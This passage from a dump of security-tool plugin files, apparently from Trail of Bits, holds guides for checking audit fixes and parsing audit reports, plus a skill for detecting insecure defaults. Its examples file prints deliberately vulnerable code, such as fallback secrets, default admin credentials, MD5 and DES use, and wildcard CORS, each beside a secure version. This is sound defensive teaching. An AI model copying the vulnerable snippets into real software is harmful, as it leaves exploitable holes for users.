\"function withdraw\"\n\n# Search for specific patterns\ngit log <source>..<target> -S \"functionName\" --oneline\n```\n\n**Extract symbols from findings:**\n- Function names: `withdraw()`, `transfer()`, `validateInput()`\n- Variable names: `balance`, `owner`, `allowance`\n- Contract/class names: `Vault`, `TokenManager`\n\n### 4. Code Pattern Matching\n\nMatch by vulnerability pattern:\n\n```bash\n# Finding mentions \"missing require statement\"\n# Search for added require statements\ngit diff <source>..<target> | grep \"^+\" | grep \"require\"\n\n# Finding mentions \"reentrancy\"\n# Search for state changes and external calls\ngit diff <source>..<target> | grep -E \"(\\.call|\\.transfer|\\.send)\"\n```\n\n---\n\n## Matching Workflow\n\n### Step 1: Extract Finding Metadata\n\nFor each finding, extract:\n\n| Field | Example |\n|-------|---------|\n| ID | TOB-CLIENT-1 |\n| Title | Missing access control in withdraw() |\n| Severity | High |\n| Files | contracts/Vault.sol:L45-L67 |\n| Functions | withdraw(), _validateCaller() |\n| Pattern | Access control |\n| Recommendation | Add onlyOwner modifier |\n\n### Step 2: Search for Direct Matches\n\n```bash\n# Check for ID in commit messages\ngit log <source>..<target> --grep=\"TOB-CLIENT-1\" --oneline\n\n# Check for title keywords\ngit log <source>..<target> --grep=\"access control\" --oneline\ngit log <source>..<target> --grep=\"withdraw\" --oneline\n```\n\n### Step 3: Identify Relevant Commits\n\nFor each file mentioned in the finding:\n\n```bash\n# Get commits that modified the file\ngit log <source>..<target> --oneline -- contracts/Vault.sol\n\n# Get the diff for that file\ngit diff <source>..<target> -- contracts/Vault.sol\n```\n\n### Step 4: Analyze Fix Quality\n\nFor each potentially matching commit:\n\n1. **Read the full diff** - Understand what changed\n2. **Compare with recommendation** - Does the fix follow the suggested approach?\n3. **Check completeness** - Are all instances of the vulnerability fixed?\n4. **Verify correctness** - Is the fix itself correct (no logic errors)?\n\n---\n\n## Status Assignment Criteria\n\n### FIXED\n\nAssign when:\n- Code change directly addresses the root cause\n- Fix follows the report's recommendation (or equivalent)\n- All instances of the vulnerability are addressed\n- No obvious issues with the fix itself\n\n**Evidence required:**\n- Commit hash\n- File and line numbers\n- Brief explanation of how fix addresses the finding\n\n### PARTIALLY_FIXED\n\nAssign when:\n- Some instances fixed, others remain\n- Fix addresses symptoms but not root cause\n- Fix is incomplete (missing edge cases)\n- Fix works but doesn't follow best practice\n\n**Evidence required:**\n- What was fixed (with commit hash)\n- What remains unfixed\n- Specific gaps in the fix\n\n### NOT_ADDRESSED\n\nAssign when:\n- No commits modify relevant files\n- Changes to relevant files don't address the finding\n- Finding relates to architecture/design not changed\n\n**Evidence required:**\n- Confirmation that relevant files were checked\n- Brief explanation of why no fix was found\n\n### CANNOT_DETERMINE\n\nAssign when:\n- Finding is ambiguous\n- Code changes are unclear\n- Requires runtime analysis to verify\n- Need additional context from developers\n\n**Evidence required:**\n- What was analyzed\n- Specific questions that need answers\n- Suggested next steps\n\n---\n\n## Complex Scenarios\n\n### Multiple Commits for One Finding\n\nWhen several commits contribute to fixing a single finding:\n\n1. List all relevant commits\n2. Analyze each contribution\n3. Determine if combined effect is FIXED or PARTIALLY_FIXED\n4. Document each commit's contribution\n\n**Example:**\n```\nTOB-XXX-1: Access control vulnerability in withdraw()\n\nCommits:\n- abc123: Added onlyOwner modifier\n- def456: Added balance check\n- ghi789: Added event emission\n\nCombined: FIXED\n- abc123 addresses the core access control issue\n- def456 adds defense in depth\n- ghi789 improves auditability\n```\n\n### One Commit for Multiple Findings\n\nWhen a single commit addresses multiple findings:\n\n1. Analyze the commit once\n2. Map specific changes to each finding\n3. Assign status to each finding individually\n4. Reference the same commit in multiple findings\n\n### Interacting Findings\n\nWhen findings are related and fixes may interact:\n\n1. Identify the relationship\n2. Analyze fixes together\n3. Check for conflicts or regressions\n4. Document the interaction\n\n**Example:**\n```\nTOB-XXX-1: Reentrancy in withdraw()\nTOB-XXX-2: Missing balance validation\n\nThese interact: A reentrancy fix might break the balance check\nAnalysis: Commit abc123 uses checks-effects-interactions pattern\nResult: Both findings addressed without conflict\n```\n\n---\n\n## Handling Ambiguity\n\n### When Finding Description is Vague\n\n1. Search for related patterns in the codebase\n2. Look for commit messages mentioning the issue\n3. Check if any changes seem security-related\n4. Mark as CANNOT_DETERMINE if unclear\n\n### When Multiple Interpretations Exist\n\n1. Document both interpretations\n2. Analyze against both\n3. Note which interpretation the fix addresses\n4. Flag for developer clarification if needed\n\n### When Fix Differs from Recommendation\n\nThe fix may be valid even if different from the recommendation:\n\n1. Understand the recommended approach\n2. Analyze the actual fix\n3. Determine if it addresses the root cause\n4. Mark as FIXED if effective, note the difference\n\n---\n\n## Git Commands Reference\n\n```bash\n# List commits in range\ngit log <source>..<target> --oneline\n\n# Search commit messages\ngit log <source>..<target> --grep=\"pattern\" --oneline\n\n# Get files changed\ngit diff <source>..<target> --name-only\n\n# Get full diff\ngit diff <source>..<target>\n\n# Get diff for specific file\ngit diff <source>..<target> -- path/to/file\n\n# Search for code changes\ngit log <source>..<target> -S \"code_pattern\" --oneline\n\n# Get commit details\ngit show <commit> --stat\ngit show <commit> -p\n\n# Blame specific lines\ngit blame <commit> -- path/to/file\n```\n",
        "plugins/fix-review/skills/fix-review/references/report-parsing.md": "# Report Parsing Strategies\n\nParsing security audit reports in various formats.\n\n## Overview\n\nSecurity reports come in multiple formats. This guide covers parsing strategies for each format and handling special cases like Google Drive URLs.\n\n---\n\n## Trail of Bits Format\n\nTrail of Bits reports follow a consistent structure.\n\n### Structure\n\n```\n1. Executive Summary\n2. Project Dashboard\n3. Engagement Goals\n4. Coverage\n5. Automated Testing\n6. Findings Overview\n7. Detailed Findings\n   - Each finding starts on new page\n   - Header table with ID, title, severity, type, target\n   - Description, Exploit Scenario, Recommendations\n8. Appendices\n```\n\n### Finding Identification\n\nEach finding has a header table:\n\n| Field | Format |\n|-------|--------|\n| ID | `TOB-[CLIENT]-[NUMBER]` (e.g., TOB-ACME-1) |\n| Title | Descriptive title |\n| Severity | Informational, Low, Medium, High |\n| Difficulty | Low, Medium, High, Undetermined |\n| Type | Access Controls, Cryptography, Data Validation, etc. |\n| Target | File path(s) |\n\n### Extraction Pattern\n\n```\n1. Locate \"Detailed Findings\" section\n2. For each finding, extract:\n   - ID: Match pattern /TOB-[A-Z]+-[0-9]+/\n   - Title: Text following ID in header\n   - Severity: From header table\n   - Target: File paths from header table\n   - Description: Content after \"Description\" heading\n   - Recommendations: Content after \"Recommendations\" heading\n```\n\n### Example Finding\n\n```markdown\n## TOB-ACME-1: Missing access control in withdraw function\n\n| Field | Value |\n|-------|-------|\n| ID | TOB-ACME-1 |\n| Severity | High |\n| Difficulty | Low |\n| Type | Access Controls |\n| Target | contracts/Vault.sol |\n\n### Description\n\nThe `withdraw` function in `Vault.sol` lacks access control...\n\n### Recommendations\n\nShort term, add the `onlyOwner` modifier...\n```\n\n---\n\n## Generic Report Formats\n\n### Numbered Findings\n\nReports with numbered findings (Finding 1, Finding 2, etc.):\n\n```\nPattern: /Finding\\s+[0-9]+:?\\s+(.+)/\n         /[0-9]+\\.\\s+(.+)/\n         /#[0-9]+\\s+(.+)/\n```\n\nExtract:\n- Number as ID\n- Following text as title\n- Look for severity keywords nearby\n\n### Severity-Based Sections\n\nReports organized by severity:\n\n```\n## Critical\n### Finding title\n...\n\n## High\n### Another finding\n...\n```\n\nExtract:\n- Section heading as severity\n- Sub-headings as finding titles\n- Generate IDs (CRITICAL-1, HIGH-1, etc.)\n\n### Table-Based Findings\n\nReports with findings in tables:\n\n```markdown\n| ID | Title | Severity | Status |\n|----|-------|----------|--------|\n| V-01 | SQL Injection | High | Open |\n| V-02 | XSS in search | Medium | Open |\n```\n\nExtract by parsing table structure.\n\n### JSON Format\n\nReports in JSON structure:\n\n```json\n{\n  \"findings\": [\n    {\n      \"id\": \"VULN-001\",\n      \"title\": \"SQL Injection\",\n      \"severity\": \"high\",\n      \"description\": \"...\",\n      \"files\": [\"app/db.py\"]\n    }\n  ]\n}\n```\n\nParse directly from JSON structure.\n\n---\n\n## Format Detection\n\nWhen report format is unknown:\n\n### Step 1: Check for TOB Format\n\n```\nSearch for: \"TOB-\" followed by letters and numbers\nIf found: Use TOB parsing\n```\n\n### Step 2: Check for JSON\n\n```\nIf file extension is .json or content starts with '{':\n  Parse as JSON\n  Look for \"findings\" array\n```\n\n### Step 3: Check for Markdown Structure\n\n```\nSearch for: \"## Finding\" or \"### Finding\"\nSearch for: Severity headings (Critical, High, Medium, Low)\nSearch for: Numbered patterns (1., 2., or Finding 1, Finding 2)\n```\n\n### Step 4: Fall Back to Keyword Extraction\n\n```\nSearch for severity keywords: critical, high, medium, low, informational\nSearch for vulnerability keywords: vulnerability, issue, bug, flaw\nExtract surrounding context as findings\n```\n\n---\n\n## Google Drive Handling\n\nWhen a Google Drive URL is provided and WebFetch fails (permissions, redirect):\n\n### Step 1: Detect Google Drive URL\n\n```\nPattern: https://drive.google.com/file/d/[FILE_ID]/...\n         https://docs.google.com/document/d/[DOC_ID]/...\n         https://drive.google.com/open?id=[FILE_ID]\n```\n\n### Step 2: Extract File ID\n\n```bash\n# From /file/d/ URLs\nFILE_ID=$(echo \"$URL\" | grep -oP 'file/d/\\K[^/]+')\n\n# From /document/d/ URLs\nFILE_ID=$(echo \"$URL\" | grep -oP 'document/d/\\K[^/]+')\n\n# From ?id= URLs\nFILE_ID=$(echo \"$URL\" | grep -oP 'id=\\K[^&]+')\n```\n\n### Step 3: Check for gdrive CLI\n\n```bash\n# Check if gdrive is installed\nif command -v gdrive &> /dev/null; then\n    # Check if gdrive is configured (has auth)\n    if gdrive about &> /dev/null; then\n        echo \"gdrive available and configured\"\n    else\n        echo \"gdrive installed but not configured\"\n    fi\nelse\n    echo \"gdrive not installed\"\nfi\n```\n\n### Step 4: Download with gdrive\n\nIf gdrive is available and configured:\n\n```bash\n# Download to temp directory\ngdrive files download \"$FILE_ID\" --path /tmp/\n\n# Find the downloaded file\nDOWNLOADED=$(ls -t /tmp/ | head -1)\n\n# Read the file\ncat \"/tmp/$DOWNLOADED\"\n```\n\n### Step 5: User Instructions (if gdrive unavailable)\n\nIf gdrive is not available or not configured:\n\n```\nUnable to access the Google Drive URL directly. Please:\n\n1. Open the URL in your browser\n2. Download the file:\n   - For Google Docs: File  Download  Markdown (.md)\n   - For PDFs: Click download button\n3. Provide the local file path\n\nAlternatively, install and configure gdrive:\n   brew install gdrive\n   gdrive about  # Follow auth prompts\n```\n\n---\n\n## File Format Handling\n\n### PDF Files\n\nClaude can read PDFs directly using the Read tool:\n\n```\nRead /path/to/report.pdf\n```\n\nFor large PDFs, process section by section:\n1. Read table of contents/overview\n2. Locate \"Findings\" section\n3. Read findings section in detail\n\n### Markdown Files\n\nRead directly:\n\n```\nRead /path/to/report.md\n```\n\n### HTML Files\n\nRead and parse:\n\n```\nRead /path/to/report.html\n```\n\nExtract text content, ignoring HTML tags.\n\n### JSON Files\n\nRead and parse as structured data:\n\n```\nRead /path/to/report.json\n```\n\nAccess fields directly from JSON structure.\n\n---\n\n## Extraction Output Format\n\nRegardless of input format, normalize findings to:\n\n```json\n{\n  \"findings\": [\n    {\n      \"id\": \"TOB-ACME-1\",\n      \"title\": \"Missing access control in withdraw\",\n      \"severity\": \"High\",\n      \"difficulty\": \"Low\",\n      \"type\": \"Access Controls\",\n      \"files\": [\"contracts/Vault.sol\"],\n      \"description\": \"The withdraw function lacks...\",\n      \"recommendation\": \"Add onlyOwner modifier...\"\n    }\n  ],\n  \"metadata\": {\n    \"client\": \"ACME\",\n    \"date\": \"2024-01-15\",\n    \"format\": \"tob\"\n  }\n}\n```\n\nThis normalized format enables consistent processing regardless of source format.\n\n---\n\n## Handling Incomplete Reports\n\nWhen report lacks standard structure:\n\n### Missing Finding IDs\n\nGenerate IDs based on:\n- Severity + sequence: `HIGH-1`, `HIGH-2`, `MEDIUM-1`\n- Position: `FINDING-1`, `FINDING-2`\n- File path: `VAULT-1`, `TOKEN-1`\n\n### Missing Severity\n\nInfer from:\n- Keywords: \"critical\", \"severe\", \"important\"  High\n- Impact description: \"attacker can steal\"  High\n- Default to \"Undetermined\" if unclear\n\n### Missing File References\n\nSearch report for:\n- File paths: `/path/to/file`, `src/module/file.py`\n- Function names: `function()`, `method()`\n- Contract names: `Contract.function`\n\n---\n\n## Error Handling\n\n### File Not Found\n\n```\nUnable to read report at [path].\nPlease verify the file exists and provide the correct path.\n```\n\n### Unsupported Format\n\n```\nUnable to parse report format.\nSupported formats: PDF, Markdown, JSON, HTML\nPlease convert to a supported format or provide as Markdown.\n```\n\n### Empty Findings\n\n```\nNo findings detected in the report.\nPlease verify this is a security audit report with findings.\nIf findings exist but weren't detected, provide them manually.\n```\n\n### Partial Parse\n\n```\nParsed [N] findings, but some content may have been missed.\nDetected findings: [list IDs]\nPlease verify all expected findings are included.\n```\n",
        "plugins/insecure-defaults/.claude-plugin/plugin.json": "{\n  \"name\": \"insecure-defaults\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Detects and verifies insecure default configurations\",\n  \"author\": {\n    \"name\": \"Trail of Bits\",\n    \"email\": \"opensource@trailofbits.com\",\n    \"url\": \"https://github.com/trailofbits\"\n  }\n}\n",
        "plugins/insecure-defaults/README.md": "# Insecure Defaults Detection\n\nSecurity skill for detecting insecure default configurations that create vulnerabilities when applications run with missing or incomplete configuration.\n\n## Overview\n\nThe `insecure-defaults` skill helps identify security vulnerabilities caused by:\n\n- **Hardcoded fallback secrets** (JWT keys, API keys, session secrets)\n- **Default credentials** (admin/admin, root/password)\n- **Weak cryptographic defaults** (MD5, DES, ECB mode)\n- **Permissive access control** (CORS *, public by default)\n- **Missing security configuration** that causes fail-open behavior\n\n**Critical Distinction:** This skill emphasizes **fail-secure vs. fail-open** behavior. Applications that crash without proper configuration are safe; applications that run with insecure defaults are vulnerable.\n\n## Installation\n\n```bash\ncd parent-folder/skills\n/plugin install ./plugins/insecure-defaults\n```\n\nOr from the plugin marketplace:\n```bash\n/plugin install insecure-defaults\n```\n\n## When to Use\n\nUse this skill when:\n\n- **Security auditing** production applications or services\n- **Configuration review** of deployment manifests (Docker, Kubernetes, IaC)\n- **Pre-production checks** before deploying new services\n- **Code review** of authentication, authorization, or cryptographic code\n- **Environment variable handling** analysis for secrets management\n- **API security review** checking CORS, rate limiting, authentication\n- **Third-party integration** review for hardcoded test credentials\n\n## Usage\n\n```\nAudit this codebase for insecure defaultsfocus on environment variable fallbacks and authentication configuration\n```\n",
        "plugins/insecure-defaults/skills/insecure-defaults/SKILL.md": "---\nname: insecure-defaults\ndescription: \"Detects fail-open insecure defaults (hardcoded secrets, weak auth, permissive security) that allow apps to run insecurely in production. Use when auditing security, reviewing config management, or analyzing environment variable handling.\"\nallowed-tools:\n  - Read\n  - Grep\n  - Glob\n  - Bash\n---\n\n# Insecure Defaults Detection\n\nFinds **fail-open** vulnerabilities where apps run insecurely with missing configuration. Distinguishes exploitable defaults from fail-secure patterns that crash safely.\n\n- **Fail-open (CRITICAL):** `SECRET = env.get('KEY') or 'default'`  App runs with weak secret\n- **Fail-secure (SAFE):** `SECRET = env['KEY']`  App crashes if missing\n\n## When to Use\n\n- **Security audits** of production applications (auth, crypto, API security)\n- **Configuration review** of deployment files, IaC templates, Docker configs\n- **Code review** of environment variable handling and secrets management\n- **Pre-deployment checks** for hardcoded credentials or weak defaults\n\n## When NOT to Use\n\nDo not use this skill for:\n- **Test fixtures** explicitly scoped to test environments (files in `test/`, `spec/`, `__tests__/`)\n- **Example/template files** (`.example`, `.template`, `.sample` suffixes)\n- **Development-only tools** (local Docker Compose for dev, debug scripts)\n- **Documentation examples** in README.md or docs/ directories\n- **Build-time configuration** that gets replaced during deployment\n- **Crash-on-missing behavior** where app won't start without proper config (fail-secure)\n\nWhen in doubt: trace the code path to determine if the app runs with the default or crashes.\n\n## Rationalizations to Reject\n\n- **\"It's just a development default\"**  If it reaches production code, it's a finding\n- **\"The production config overrides it\"**  Verify prod config exists; code-level vulnerability remains if not\n- **\"This would never run without proper config\"**  Prove it with code trace; many apps fail silently\n- **\"It's behind authentication\"**  Defense in depth; compromised session still exploits weak defaults\n- **\"We'll fix it before release\"**  Document now; \"later\" rarely comes\n\n## Workflow\n\nFollow this workflow for every potential finding:\n\n### 1. SEARCH: Perform Project Discovery and Find Insecure Defaults\n\nDetermine language, framework, and project conventions. Use this information to further discover things like secret storage locations, secret usage patterns, credentialed third-party integrations, cryptography, and any other relevant configuration. Further use information to analyze insecure default configurations.\n\n**Example**\nSearch for patterns in `**/config/`, `**/auth/`, `**/database/`, and env files:\n- **Fallback secrets:** `getenv.*\\) or ['\"]`, `process\\.env\\.[A-Z_]+ \\|\\| ['\"]`, `ENV\\.fetch.*default:`\n- **Hardcoded credentials:** `password.*=.*['\"][^'\"]{8,}['\"]`, `api[_-]?key.*=.*['\"][^'\"]+['\"]`\n- **Weak defaults:** `DEBUG.*=.*true`, `AUTH.*=.*false`, `CORS.*=.*\\*`\n- **Crypto algorithms:** `MD5|SHA1|DES|RC4|ECB` in security contexts\n\nTailor search approach based on discovery results.\n\nFocus on production-reachable code, not test fixtures or example files.\n\n### 2. VERIFY: Actual Behavior\nFor each match, trace the code path to understand runtime behavior.\n\n**Questions to answer:**\n- When is this code executed? (Startup vs. runtime)\n- What happens if a configuration variable is missing?\n- Is there validation that enforces secure configuration?\n\n### 3. CONFIRM: Production Impact\nDetermine if this issue reaches production:\n\nIf production config provides the variable  Lower severity (but still a code-level vulnerability)\nIf production config missing or uses default  CRITICAL\n\n### 4. REPORT: with Evidence\n\n**Example report:**\n```\nFinding: Hardcoded JWT Secret Fallback\nLocation: src/auth/jwt.ts:15\nPattern: const secret = process.env.JWT_SECRET || 'default';\n\nVerification: App starts without JWT_SECRET; secret used in jwt.sign() at line 42\nProduction Impact: Dockerfile missing JWT_SECRET\nExploitation: Attacker forges JWTs using 'default', gains unauthorized access\n```\n\n## Quick Verification Checklist\n\n**Fallback Secrets:** `SECRET = env.get(X) or Y`\n Verify: App starts without env var? Secret used in crypto/auth?\n Skip: Test fixtures, example files\n\n**Default Credentials:** Hardcoded `username`/`password` pairs\n Verify: Active in deployed config? No runtime override?\n Skip: Disabled accounts, documentation examples\n\n**Fail-Open Security:** `AUTH_REQUIRED = env.get(X, 'false')`\n Verify: Default is insecure (false/disabled/permissive)?\n Safe: App crashes or default is secure (true/enabled/restricted)\n\n**Weak Crypto:** MD5/SHA1/DES/RC4/ECB in security contexts\n Verify: Used for passwords, encryption, or tokens?\n Skip: Checksums, non-security hashing\n\n**Permissive Access:** CORS `*`, permissions `0777`, public-by-default\n Verify: Default allows unauthorized access?\n Skip: Explicitly configured permissiveness with justification\n\n**Debug Features:** Stack traces, introspection, verbose errors\n Verify: Enabled by default? Exposed in responses?\n Skip: Logging-only, not user-facing\n\nFor detailed examples and counter-examples, see [examples.md](references/examples.md).\n",
        "plugins/insecure-defaults/skills/insecure-defaults/references/examples.md": "# Insecure Defaults: Examples and Counter-Examples\n\nThis document provides detailed examples for each category in the Quick Verification Checklist, showing both vulnerable patterns (report these) and secure patterns (skip these).\n\n## Fallback Secrets\n\n###  VULNERABLE - Report These\n\n**Python: Environment variable with fallback**\n```python\n# File: src/auth/jwt.py\nSECRET_KEY = os.environ.get('SECRET_KEY', 'dev-secret-key-123')\n\n# Used in security context\ndef create_token(user_id):\n    return jwt.encode({'user_id': user_id}, SECRET_KEY, algorithm='HS256')\n```\n**Why vulnerable:** App runs with known secret if `SECRET_KEY` is missing. Attacker can forge tokens.\n\n**JavaScript: Logical OR fallback**\n```javascript\n// File: config/database.js\nconst DB_PASSWORD = process.env.DB_PASSWORD || 'admin123';\n\nconst pool = new Pool({\n  user: 'admin',\n  password: DB_PASSWORD,\n  database: 'production'\n});\n```\n**Why vulnerable:** Database accepts hardcoded password in production if env var missing.\n\n**Ruby: fetch with default**\n```ruby\n# File: config/secrets.rb\nRails.application.credentials.secret_key_base =\n  ENV.fetch('SECRET_KEY_BASE', 'fallback-secret-base')\n```\n**Why vulnerable:** Rails session encryption uses weak known key as fallback.\n\n###  SECURE - Skip These\n\n**Fail-secure: Crashes without config**\n```python\n# File: src/auth/jwt.py\nSECRET_KEY = os.environ['SECRET_KEY']  # Raises KeyError if missing\n\n# App won't start without SECRET_KEY - fail-secure\n```\n\n**Explicit validation**\n```javascript\n// File: config/database.js\nif (!process.env.DB_PASSWORD) {\n  throw new Error('DB_PASSWORD environment variable required');\n}\nconst DB_PASSWORD = process.env.DB_PASSWORD;\n```\n\n**Test fixtures (clearly scoped)**\n```python\n# File: tests/fixtures/auth.py\nTEST_SECRET = 'test-secret-key-123'  # OK - test-only\n\n# Usage in test\ndef test_token_creation():\n    token = create_token('user1', secret=TEST_SECRET)\n```\n\n---\n\n## Default Credentials\n\n###  VULNERABLE - Report These\n\n**Hardcoded admin account**\n```python\n# File: src/models/user.py\ndef bootstrap_admin():\n    \"\"\"Create default admin account if none exists\"\"\"\n    if not User.query.filter_by(role='admin').first():\n        admin = User(\n            username='admin',\n            password=hash_password('admin123'),\n            role='admin'\n        )\n        db.session.add(admin)\n        db.session.commit()\n```\n**Why vulnerable:** Default admin account created on first run with known credentials.\n\n**API key in code**\n```javascript\n// File: src/integrations/payment.js\nconst STRIPE_API_KEY = process.env.STRIPE_KEY || 'sk_tes...';\n\nconst stripe = require('stripe')(STRIPE_API_KEY);\n```\n**Why vulnerable:** Uses test API key if env var missing. Might reach production.\n\n**Database connection string**\n```java\n// File: DatabaseConfig.java\nprivate static final String DB_URL = System.getenv().getOrDefault(\n    \"DATABASE_URL\",\n    \"postgresql://admin:password@localhost:5432/prod\"\n);\n```\n**Why vulnerable:** Hardcoded database credentials as fallback.\n\n###  SECURE - Skip These\n\n**Disabled default account**\n```python\n# File: src/models/user.py\ndef bootstrap_admin():\n    \"\"\"Admin account MUST be configured via environment\"\"\"\n    username = os.environ['ADMIN_USERNAME']\n    password = os.environ['ADMIN_PASSWORD']\n\n    if not User.query.filter_by(username=username).first():\n        admin = User(username=username, password=hash_password(password), role='admin')\n        db.session.add(admin)\n```\n\n**Example/documentation credentials**\n```bash\n# File: README.md\n## Setup\n\nConfigure your API key:\n```bash\nexport STRIPE_KEY='sk_tes...'  # Example only\n```\n```\n\n**Test fixture credentials**\n```python\n# File: tests/conftest.py\n@pytest.fixture\ndef test_user():\n    return User(username='test_user', password='test_pass')  # OK - test scope\n```\n\n---\n\n## Fail-Open Security\n\n###  VULNERABLE - Report These\n\n**Authentication disabled by default**\n```python\n# File: config/security.py\nREQUIRE_AUTH = os.getenv('REQUIRE_AUTH', 'false').lower() == 'true'\n\n@app.before_request\ndef check_auth():\n    if not REQUIRE_AUTH:\n        return  # Skip auth check\n    # ... auth logic\n```\n**Why vulnerable:** Default is no authentication. App runs insecurely if env var missing.\n\n**CORS allows all origins**\n```javascript\n// File: server.js\nconst allowedOrigins = process.env.ALLOWED_ORIGINS || '*';\n\napp.use(cors({ origin: allowedOrigins }));\n```\n**Why vulnerable:** Default allows requests from any origin. XSS/CSRF risk.\n\n**Debug mode enabled by default**\n```python\n# File: config.py\nDEBUG = os.getenv('DEBUG', 'true').lower() != 'false'  # Default: true\n\nif DEBUG:\n    app.config['DEBUG'] = True\n    app.config['PROPAGATE_EXCEPTIONS'] = True\n```\n**Why vulnerable:** Debug mode default. Stack traces leak sensitive info in production.\n\n###  SECURE - Skip These\n\n**Authentication required by default**\n```python\n# File: config/security.py\nREQUIRE_AUTH = os.getenv('REQUIRE_AUTH', 'true').lower() == 'true'  # Default: true\n\n# Or better - crash if not explicitly configured\nREQUIRE_AUTH = os.environ['REQUIRE_AUTH'].lower() == 'true'\n```\n\n**CORS requires explicit configuration**\n```javascript\n// File: server.js\nif (!process.env.ALLOWED_ORIGINS) {\n  throw new Error('ALLOWED_ORIGINS must be configured');\n}\nconst allowedOrigins = process.env.ALLOWED_ORIGINS.split(',');\n\napp.use(cors({ origin: allowedOrigins }));\n```\n\n**Debug mode disabled by default**\n```python\n# File: config.py\nDEBUG = os.getenv('DEBUG', 'false').lower() == 'true'  # Default: false\n```\n\n---\n\n## Weak Crypto\n\n###  VULNERABLE - Report These\n\n**MD5 for password hashing**\n```python\n# File: src/auth/passwords.py\nimport hashlib\n\ndef hash_password(password):\n    \"\"\"Hash user password\"\"\"\n    return hashlib.md5(password.encode()).hexdigest()\n```\n**Why vulnerable:** MD5 is cryptographically broken. Rainbow tables exist. Use bcrypt/Argon2.\n\n**DES encryption for sensitive data**\n```java\n// File: Encryption.java\npublic static byte[] encrypt(String data, byte[] key) {\n    Cipher cipher = Cipher.getInstance(\"DES/ECB/PKCS5Padding\");\n    SecretKeySpec secretKey = new SecretKeySpec(key, \"DES\");\n    cipher.init(Cipher.ENCRYPT_MODE, secretKey);\n    return cipher.doFinal(data.getBytes());\n}\n```\n**Why vulnerable:** DES has 56-bit keys (brute-forceable). ECB mode leaks patterns.\n\n**SHA1 for signature verification**\n```javascript\n// File: webhooks.js\nfunction verifySignature(payload, signature) {\n  const hmac = crypto.createHmac('sha1', WEBHOOK_SECRET);\n  const computed = hmac.update(payload).digest('hex');\n  return computed === signature;\n}\n```\n**Why vulnerable:** SHA1 collisions exist. Use SHA256 or better.\n\n###  SECURE - Skip These\n\n**Weak crypto for non-security checksums**\n```python\n# File: src/utils/cache.py\nimport hashlib\n\ndef cache_key(data):\n    \"\"\"Generate cache key - not security-sensitive\"\"\"\n    return hashlib.md5(data.encode()).hexdigest()  # OK - just for cache lookup\n```\n\n**Modern crypto for passwords**\n```python\n# File: src/auth/passwords.py\nimport bcrypt\n\ndef hash_password(password):\n    return bcrypt.hashpw(password.encode(), bcrypt.gensalt())\n```\n\n**Strong encryption**\n```java\n// File: Encryption.java\nCipher cipher = Cipher.getInstance(\"AES/GCM/NoPadding\");\n// 256-bit key, authenticated encryption\n```\n\n---\n\n## Permissive Access\n\n###  VULNERABLE - Report These\n\n**File permissions world-writable**\n```python\n# File: src/storage/files.py\ndef create_secure_file(path):\n    fd = os.open(path, os.O_CREAT | os.O_WRONLY, 0o666)  # rw-rw-rw-\n    return fd\n```\n**Why vulnerable:** Any user can write to file. Should be 0o600 or 0o644.\n\n**S3 bucket public by default**\n```python\n# File: infrastructure/storage.py\ndef create_storage_bucket(name):\n    bucket = s3.create_bucket(\n        Bucket=name,\n        ACL='public-read'  # Publicly readable by default\n    )\n```\n**Why vulnerable:** Sensitive data exposed publicly. Should require explicit configuration.\n\n**API allows any origin**\n```python\n# File: app.py\n@app.after_request\ndef after_request(response):\n    response.headers['Access-Control-Allow-Origin'] = '*'\n    response.headers['Access-Control-Allow-Credentials'] = 'true'\n    return response\n```\n**Why vulnerable:** CORS misconfiguration. Allows credential theft from any site.\n\n###  SECURE - Skip These\n\n**Explicitly configured permissiveness with justification**\n```python\n# File: src/storage/public_assets.py\ndef create_public_asset(path):\n    \"\"\"Create world-readable asset for CDN distribution\"\"\"\n    # Intentionally public - static assets only\n    fd = os.open(path, os.O_CREAT | os.O_WRONLY, 0o644)\n    return fd\n```\n\n**Restrictive by default**\n```python\n# File: infrastructure/storage.py\ndef create_storage_bucket(name, public=False):\n    acl = 'public-read' if public else 'private'\n    if public:\n        logger.warning(f'Creating PUBLIC bucket: {name}')\n    bucket = s3.create_bucket(Bucket=name, ACL=acl)\n```\n\n---\n\n## Debug Features\n\n###  VULNERABLE - Report These\n\n**Stack traces in API responses**\n```python\n# File: app.py\n@app.errorhandler(Exception)\ndef handle_error(error):\n    return jsonify({\n        'error': str(error),\n        'traceback': traceback.format_exc()  # Leaks internal paths, library versions\n    }), 500\n```\n**Why vulnerable:** Exposes internal implementation details to attackers.\n\n**GraphQL introspection enabled**\n```javascript\n// File: server.js\nconst server = new ApolloServer({\n  typeDefs,\n  resolvers,\n  introspection: true,  // Enabled in production\n  playground: true\n});\n```\n**Why vulnerable:** Attackers can discover entire API schema, including admin-only fields.\n\n**Verbose error messages**\n```java\n// File: UserController.java\ncatch (SQLException e) {\n    return ResponseEntity.status(500).body(\n        \"Database error: \" + e.getMessage()  // Leaks table names, constraints\n    );\n}\n```\n**Why vulnerable:** SQL error messages reveal database structure.\n\n###  SECURE - Skip These\n\n**Debug features in logging only**\n```python\n# File: app.py\n@app.errorhandler(Exception)\ndef handle_error(error):\n    logger.exception('Request failed', exc_info=error)  # Logs full trace\n    return jsonify({'error': 'Internal server error'}), 500  # Generic to user\n```\n\n**Environment-aware debug settings**\n```javascript\n// File: server.js\nconst server = new ApolloServer({\n  typeDefs,\n  resolvers,\n  introspection: process.env.NODE_ENV !== 'production',\n  playground: process.env.NODE_ENV !== 'production'\n});\n```\n\n**Generic user-facing errors**\n```java\n// File: UserController.java\ncatch (SQLException e) {\n    logger.error(\"Database error\", e);  // Full details to logs\n    return ResponseEntity.status(500).body(\"Unable to process request\");  // Generic\n}\n```\n",
        "plugins/modern-python/.claude-plugin/plugin.json": "{\n  \"name\": \"modern-python\",\n  \"version\": \"1.2.0\",\n  \"description\": \"Modern Python best practices. Use when creating new Python projects, and writing Python scripts, or migrating existing projects from legacy tools.\",\n  \"author\": {\n    \"name\": \"William Tan\",\n    \"email\": \"opensource@trailofbits.com\",\n    \"url\": \"https://github.com/trailofbits\"\n  }\n}\n",
